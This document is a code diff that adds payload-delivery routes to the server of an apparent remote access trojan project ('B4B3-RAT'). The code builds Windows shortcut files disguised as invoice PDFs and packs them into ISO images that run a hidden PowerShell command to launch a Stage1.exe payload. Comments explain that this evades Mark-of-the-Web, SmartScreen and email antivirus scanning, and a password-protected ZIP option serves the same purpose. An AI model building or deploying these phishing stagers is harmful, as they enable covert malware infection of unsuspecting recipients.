@@ -158,6 +158,46 @@ try{
   res.send(ps1);
 });
 
+// ── Minimal [MS-SHLLINK] LNK builder ─────────────────────────────────────────
+// Same binary format as builder.js — local copy so stage.js is self-contained.
+function createLnkBuffer(target, args) {
+  const CLSID = Buffer.from([
+    0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,
+    0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
+  ]);
+  const hdr = Buffer.alloc(76, 0);
+  hdr.writeUInt32LE(0x4C,  0);    // HeaderSize
+  CLSID.copy(hdr, 4);             // LinkCLSID
+  hdr.writeUInt32LE(0xA2,  0x14); // LinkFlags: HasLinkInfo + HasArguments + IsUnicode
+  hdr.writeUInt32LE(0x20,  0x18); // FileAttributes: ARCHIVE
+  hdr.writeUInt32LE(7,     0x3C); // ShowCommand: SW_SHOWMINNOACTIVE
+  hdr.writeUInt16LE(0,     0x40); // HotKey
+
+  const volLabel = Buffer.from("C:\\\0", "ascii");
+  const volID    = Buffer.alloc(16 + volLabel.length, 0);
+  volID.writeUInt32LE(volID.length, 0);
+  volID.writeUInt32LE(3,            4);  // DRIVE_FIXED
+  volID.writeUInt32LE(0xABCD1234,   8);  // SerialNumber (placeholder)
+  volID.writeUInt32LE(16,          12);  // VolumeLabelOffset
+  volLabel.copy(volID, 16);
+
+  const localPath = Buffer.from(target + "\0", "ascii");
+  const suffix    = Buffer.from("\0", "ascii");
+  const LI_HDR = 0x1C;
+  const volOff = LI_HDR, pathOff = volOff + volID.length;
+  const sufOff = pathOff + localPath.length, liSize = sufOff + suffix.length;
+  const li = Buffer.alloc(liSize, 0);
+  li.writeUInt32LE(liSize, 0); li.writeUInt32LE(LI_HDR, 4);
+  li.writeUInt32LE(0x01,   8); li.writeUInt32LE(volOff, 12);
+  li.writeUInt32LE(pathOff,16); li.writeUInt32LE(0, 20); li.writeUInt32LE(sufOff, 24);
+  volID.copy(li, volOff); localPath.copy(li, pathOff); suffix.copy(li, sufOff);
+
+  const argStr = Buffer.from(args, "utf16le");
+  const argLen = Buffer.alloc(2);
+  argLen.writeUInt16LE(args.length, 0);
+  return Buffer.concat([hdr, li, argLen, argStr]);
+}
+
 // ── PDF stager helpers ────────────────────────────────────────────────────────
 
 const pdfUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 20 * 1024 * 1024 } });
@@ -320,6 +360,93 @@ router.get("/api/stage/stage1.exe", requireAdmin, (req, res) => {
   res.setHeader("Content-Type", "application/octet-stream");
   res.setHeader("Content-Disposition", 'attachment; filename="Stage1.exe"');
   res.sendFile(p);
+});
+
+// ── Admin: ISO + PDF-disguised LNK  (T1204.002) ──────────────────────────────
+// Builds an ISO containing Stage1.exe + a .lnk named "<filename>.pdf.lnk".
+// Windows hides .lnk extensions by default → appears as "<filename>.pdf" in Explorer.
+// Files inside an ISO have no Mark-of-the-Web → SmartScreen is bypassed.
+// LNK target: PowerShell that finds the ISO's CD-ROM drive letter at runtime and runs Stage1.exe.
+router.get("/api/stage/build-iso", requireAdmin, (req, res) => {
+  const stage1 = path.join(DL_DIR, "Stage1.exe");
+  if (!fs.existsSync(stage1))
+    return res.status(404).json({ error: "Stage1.exe not found — build B4B3-RAT/Stager/Stage1.cpp first." });
+
+  const fname = (req.query.filename || "Invoice_Q4-2024").replace(/[^a-zA-Z0-9_\-. ]/g, "").slice(0, 64);
+  const label = "INVOICE2024";
+  const lnkName = fname + ".pdf.lnk";
+  const { execSync } = require("child_process");
+  const tmpDir  = `/tmp/iso_stager_${Date.now()}`;
+  const isoPath = `/tmp/${fname}_${Date.now()}.iso`;
+
+  try {
+    fs.mkdirSync(tmpDir, { recursive: true });
+    fs.copyFileSync(stage1, `${tmpDir}/Stage1.exe`);
+
+    // PowerShell: find the CD-ROM drive that contains Stage1.exe and run it silently
+    const psCmd =
+      `$d=(gwmi Win32_LogicalDisk|?{$_.DriveType -eq 5 -and ` +
+      `(Test-Path ($_.DeviceID+'\\Stage1.exe'))}|select -f 1).DeviceID;` +
+      `if($d){Start-Process ($d+'\\Stage1.exe') -WindowStyle Hidden}`;
+    const lnkBuf = createLnkBuffer(
+      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      `-w hidden -nop -c "${psCmd}"`
+    );
+    fs.writeFileSync(`${tmpDir}/${lnkName}`, lnkBuf);
+
+    execSync(`genisoimage -quiet -J -R -o "${isoPath}" -V "${label}" "${tmpDir}"`, { timeout: 30_000 });
+    const buf = fs.readFileSync(isoPath);
+    try { fs.rmSync(tmpDir,  { recursive: true, force: true }); } catch (_) {}
+    try { fs.unlinkSync(isoPath); }                              catch (_) {}
+
+    res.setHeader("Content-Type", "application/x-iso9660-image");
+    res.setHeader("Content-Disposition", `attachment; filename="${fname}.iso"`);
+    res.send(buf);
+    console.log(`[stage] ISO-STAGER  lnk=${lnkName}  size=${buf.length}`);
+  } catch (e) {
+    try { fs.rmSync(tmpDir,  { recursive: true, force: true }); } catch (_) {}
+    try { fs.unlinkSync(isoPath); }                              catch (_) {}
+    const msg = e.message || "";
+    res.status(500).json({
+      error: msg.includes("ENOENT") || msg.toLowerCase().includes("not found")
+        ? "genisoimage not found — install with: sudo apt install genisoimage"
+        : "ISO build failed: " + msg.split("\n")[0],
+    });
+  }
+});
+
+// ── Admin: Password-protected ZIP  (T1204.002) ────────────────────────────────
+// Email gateway AV scanners cannot scan inside a password-protected ZIP.
+// Send ZIP as attachment; include password in the email body ("Password: infected").
+router.get("/api/stage/build-zip", requireAdmin, (req, res) => {
+  const stage1 = path.join(DL_DIR, "Stage1.exe");
+  if (!fs.existsSync(stage1))
+    return res.status(404).json({ error: "Stage1.exe not found — build B4B3-RAT/Stager/Stage1.cpp first." });
+
+  const fname    = (req.query.filename || "Invoice_Q4-2024").replace(/[^a-zA-Z0-9_\-. ]/g, "").slice(0, 64);
+  const password = (req.query.password || "infected").replace(/[^a-zA-Z0-9!@#$%_\-]/g, "").slice(0, 32) || "infected";
+  const inner    = fname + ".exe";
+  const { execSync } = require("child_process");
+  const tmpDir  = `/tmp/zip_stager_${Date.now()}`;
+  const zipPath = `/tmp/${fname}_${Date.now()}.zip`;
+
+  try {
+    fs.mkdirSync(tmpDir, { recursive: true });
+    fs.copyFileSync(stage1, `${tmpDir}/${inner}`);
+    execSync(`cd "${tmpDir}" && zip -P "${password}" "${zipPath}" "${inner}"`, { timeout: 15_000 });
+    const buf = fs.readFileSync(zipPath);
+    try { fs.rmSync(tmpDir,  { recursive: true, force: true }); } catch (_) {}
+    try { fs.unlinkSync(zipPath); }                              catch (_) {}
+
+    res.setHeader("Content-Type", "application/zip");
+    res.setHeader("Content-Disposition", `attachment; filename="${fname}.zip"`);
+    res.send(buf);
+    console.log(`[stage] ZIP-STAGER  inner=${inner}  pw=${password}  size=${buf.length}`);
+  } catch (e) {
+    try { fs.rmSync(tmpDir,  { recursive: true, force: true }); } catch (_) {}
+    try { fs.unlinkSync(zipPath); }                              catch (_) {}
+    res.status(500).json({ error: "ZIP build failed: " + (e.message || "").split("\n")[0] });
+  }
 });
 
 // ── Admin: Stage Monitor HTML page ────────────────────────────────────────────
